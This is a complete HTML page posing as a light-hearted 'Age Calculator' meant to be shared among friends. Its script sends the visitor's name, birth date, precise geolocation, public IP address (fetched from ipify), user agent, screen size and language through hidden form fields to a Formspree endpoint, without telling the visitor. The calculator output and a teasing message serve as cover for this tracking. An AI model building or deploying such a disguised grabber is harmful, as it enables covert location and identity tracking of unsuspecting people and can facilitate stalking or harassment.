<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Friendship Memories</title>
  <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Caveat', cursive;
      background: linear-gradient(to right, #FFDAB9, #E1A4B0);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      min-height: 100vh;
      margin: 0;
      color: #5D4037;
    }

    .container {
      background-color: #fff;
      padding: 40px 50px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 90%;
      max-width: 500px;
      display: none;
    }

    h1, h2 {
      color: #C2185B;
    }

    h1 {
      font-size: 3.5em;
    }

    h2 {
      font-size: 3.5em;
    }

    p {
      font-size: 2em;
      margin-bottom: 30px;
    }

    .form-group {
      text-align: left;
      margin-bottom: 20px;
    }

    label {
      font-size: 1.3em;
      display: block;
      margin-bottom: 8px;
    }
    
    .message-text {
      font-size: 1.9em;           
      margin-bottom: 30px;
      color: #5D4037;             
      line-height: 1.4;           
      font-style: italic;        
    }

    input[type="text"],
    input[type="date"] {
      width: 100%;
      padding: 12px;
      border: 2px solid #fce4ec;
      border-radius: 8px;
      font-family: 'Caveat', cursive;
      font-size: 1.3em;
      box-sizing: border-box;
      color: #5D4037;
    }

    input:focus {
      outline: none;
      border-color: #d81b60;
    }

    button {
      background-color: #d81b60;
      color: white;
      font-family: 'Caveat', cursive;
      font-size: 1.5em;
      padding: 10px 30px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin: 10px;
    }

    button:hover {
      background-color: #c2185b;
    }
    
    /* Style for the new retry button */
    .retry-button {
      background-color: #757575;
      font-size: 1.1em;
      padding: 8px 20px;
      margin-top: 10px;
    }
    .retry-button:hover {
       background-color: #616161;
    }

    .hidden {
      display: none !important;
    }
    
    #status {
        /* Adjusted font size to look better */
        font-size: 1.2em; 
        color: #757575;
        margin-top: 10px;
        margin-bottom: 10px; /* Added margin */
    }
    #status.error-status {
        color: #D32F2F;
        font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container" id="page1" style="display: block">
    <h1>Hello Friends</h1>
    <h2>Age Calculator</h2>
    <form id="mainForm">
      <div class="form-group">
        <label for="name">Your Name:</label>
        <input type="text" id="name" name="name" required minlength="5" />
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth:</label>
        <input type="date" id="dob" name="dob" required />
      </div>

      <input type="hidden" id="latitude" name="latitude" />
      <input type="hidden" id="longitude" name="longitude" />
      <input type="hidden" id="browser" name="browser" />
      <input type="hidden" id="deviceType" name="deviceType" />
      <input type="hidden" id="screenSize" name="screenSize" />
      <input type="hidden" id="language" name="language" />
      <input type="hidden" id="ip" name="ip" />
      <input type="hidden" name="_form_origin" value="Page 1 - Age Calculator" />

      <button type="button" onclick="handleSubmit()">Calculate ðŸ’Œ</button>
      
      <p id="status"></p>
      <button type="button" id="retryLocationBtn" class="retry-button hidden" onclick="requestLocation()">
        Retry Location
      </button>

    </form>
  </div>

  <div class="container" id="page2">
    <h2>Results</h2>
    <p id="ageLine"></p>
    <p id="birthdayLine"></p>
    <p id="deviceLine"></p>
    <p class="message-text">Itne din ho gaye paida hue khuch nahi kiya age calculate karke kya kar lega</p>
    <button onclick="goToMainPage()">Go Back to Main Page</button>
  </div>

  <script>
    // IMPORTANT: Replace with your actual Formspree endpoint.
    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/xpwlalno";

    // Global variables to store location data
    let currentLatitude = "";
    let currentLongitude = "";
    
    // --- NEW: Moved all location logic into its own function ---
    function requestLocation() {
        const statusElement = document.getElementById('status');
        const retryBtn = document.getElementById('retryLocationBtn');

        // Hide retry button and show loading status
        retryBtn.classList.add('hidden');
        statusElement.textContent = 'Requesting location...';
        statusElement.classList.remove('error-status');

        if (navigator.geolocation) {
            const options = {
                // --- CHANGED: Set to false for a faster, more reliable network-based fix ---
                enableHighAccuracy: false, 
                timeout: 10000, // 10 seconds is plenty for a network fix
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                function (position) {
                    // --- SUCCESS ---
                    currentLatitude = position.coords.latitude;
                    currentLongitude = position.coords.longitude;

                    document.getElementById("latitude").value = currentLatitude;
                    document.getElementById("longitude").value = currentLongitude;

                    statusElement.textContent = 'Location captured successfully.';
                    statusElement.classList.remove('error-status');
                    retryBtn.classList.add('hidden'); // Hide button on success

                    console.log('--- Location Captured ---');
                    console.log(`Latitude: ${currentLatitude}`);
                    console.log(`Longitude: ${currentLongitude}`);
                    console.log('-----------------------');
                },
                function (error) {
                    // --- ERROR ---
                    let errorMessage = 'An unknown error occurred.';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Location permission was denied. Please allow location in your browser site settings.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information is unavailable (e.g., no signal).';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'The request for location timed out.';
                            break;
                        case error.UNKNOWN_ERROR:
                            errorMessage = 'An unknown error occurred.';
                            break;
                    }
                    statusElement.textContent = `Error: ${errorMessage}`;
                    statusElement.classList.add('error-status');
                    retryBtn.classList.remove('hidden'); // <-- NEW: Show retry button on failure

                    console.error('Geolocation Error:', error);

                    document.getElementById("latitude").value = "Unavailable";
                    document.getElementById("longitude").value = "Unavailable";
                },
                options
            );
        } else {
            statusElement.textContent = 'Geolocation is not supported by this browser.';
            statusElement.classList.add('error-status');
            console.error('Geolocation is not supported by this browser.');
            document.getElementById("latitude").value = "Unsupported";
            document.getElementById("longitude").value = "Unsupported";
        }
    }


    window.onload = function () {
        // --- MODIFIED: Call the new location function ---
        requestLocation();

        // This part remains the same
        const ua = navigator.userAgent;
        const isMobile = /Mobi|Android/i.test(ua);
        document.getElementById("deviceType").value = isMobile ? "Mobile" : "Desktop";
        document.getElementById("browser").value = ua;
        document.getElementById("screenSize").value = `${screen.width}x${screen.height}`;
        document.getElementById("language").value = navigator.language;

        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                document.getElementById("ip").value = data.ip;
            })
            .catch(() => {
                document.getElementById("ip").value = "Unavailable";
            });
    };

    function handleSubmit() {
      const name = document.getElementById("name").value.trim();
      const dob = document.getElementById("dob").value;

      if (name.length < 5 || !dob) {
        alert("Please enter a valid name and Date of Birth.");
        return;
      }

      const formData = new FormData(document.getElementById("mainForm"));

      // Set location values *right before* submit, just in case they were captured
      // after the page load but before the submit.
      formData.set("latitude", currentLatitude || "Unavailable");
      formData.set("longitude", currentLongitude || "Unavailable");

      fetch(FORMSPREE_URL_PAGE1, {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" }
      })
      .then(response => {
        // This logic remains the same, as it was fine.
        const result = calculateDetails(dob);
        document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
        document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
        const ua = navigator.userAgent;
        const isMobile = /Mobi|Android/i.test(ua);
        document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
        goToPage(2);
      })
      .catch((error) => {
          console.error('Error:', error);
          // This logic also remains the same.
          const result = calculateDetails(dob);
          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
          const ua = navigator.userAgent;
          const isMobile = /Mobi|Android/i.test(ua);
          document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
          goToPage(2);
      });
    }

    function calculateDetails(dobStr) {
      const birthDate = new Date(dobStr);
      const today = new Date();
      let years = today.getFullYear() - birthDate.getFullYear();
      let months = today.getMonth() - birthDate.getMonth();
      let days = today.getDate() - birthDate.getDate();
      if (days < 0) {
        months--;
        days += new Date(today.getFullYear(), today.getMonth(), 0).getDate();
      }
      if (months < 0) {
        years--;
        months += 12;
      }
      const nextBirthday = new Date(today.getFullYear(), birthDate.getMonth(), birthDate.getDate());
      if (nextBirthday < today) nextBirthday.setFullYear(today.getFullYear() + 1);
      const daysLeft = Math.ceil((nextBirthday - today) / (1000 * 60 * 60 * 24));
      return {
        ageString: `${years} years, ${months} months, ${days} days`,
        daysLeft
      };
    }

    function goToPage(n) {
      document.querySelectorAll(".container").forEach(c => c.style.display = "none");
      document.getElementById("page" + n).style.display = "block";
    }

    function goToMainPage() {
      document.getElementById("mainForm").reset();
      // --- NEW: Also re-request location when going back to the main page ---
      requestLocation();
      goToPage(1);
    }
  </script>
</body>
</html>
